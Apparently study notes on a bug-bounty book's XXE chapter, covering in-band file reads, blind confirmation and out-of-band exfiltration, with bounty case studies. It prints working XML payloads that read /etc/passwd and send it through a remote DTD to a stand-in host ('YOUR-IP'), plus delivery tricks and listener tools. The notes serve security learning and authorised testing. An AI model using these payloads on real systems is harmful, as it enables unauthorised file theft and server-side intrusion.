# Ch 8 — XML External Entity (XXE)

Any XML parsing = XXE test. The book's arc: in-band file read → blind confirmation → out-of-band exfiltration.

## Three escalation levels

**1. In-band (result in response)** — Google Toolbar gallery ($10k): uploaded XML button def with `<!ENTITY xxe SYSTEM "file:///etc/passwd">` → `&xxe;` in a rendered field → passwd printed. *Takeaway: XML uploads everywhere — buttons, imports, config, Office docs.*

**2. Blind confirm (no reflection)** — can't see file contents in the response? Prove the parser evaluates your entity by calling home:

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://YOUR-SERVER/XXE">]>
```

…in an expected field (Wikiloc used `<name>` inside a legit `.gpx` template — **keep the site's expected XML structure**, inject entities inside it). HTTP hit on your listener = parser evaluates external entities.

**3. OOB exfiltration via remote DTD** — the Facebook-docx ($6,300) and Wikiloc chain:

Payload in uploaded doc:

```xml
<!DOCTYPE root [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://YOUR-IP/ext.dtd">
%dtd;
%send;
]>
```

`ext.dtd` served by you:

```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://YOUR-IP/?%26file;'>">
%all;
```

Evaluation chain:
1. Parser expands `%dtd` → fetches your remote DTD.
2. DTD's `%all` defines `send` entity = URL containing `%file` contents.
3. `&send;` in the doc → parser resolves → **file contents leave as a URL parameter** to your server.

Parameter entities (`%name`) are defined inside the DTD itself — that's what lets you smuggle data out when in-band reflection isn't available.

## Delivery surfaces

- Direct XML endpoints (`<?xml` in request bodies).
- File uploads accepting `.xml`, `.gpx`, `.svg`, `.rss`.
- **Office archives** — `.docx`/`.xlsx`/`.pptx` are zip-of-XML: unzip, inject DOCTYPE into `document.xml`, rezip (Facebook careers upload).
- SOAP/WSDL services (always XML).
- `SimpleHTTPServer`/`nc`/interactsh as the OOB listener.

## Notes

- If `file:///` fails, try `php://filter`, `expect://`, `http://` internal URLs (XXE→SSRF), `jar://`.
- Report rejection happens — Facebook initially couldn't repro (a recruiter had opened the file). Persist, provide video PoC, stay respectful.
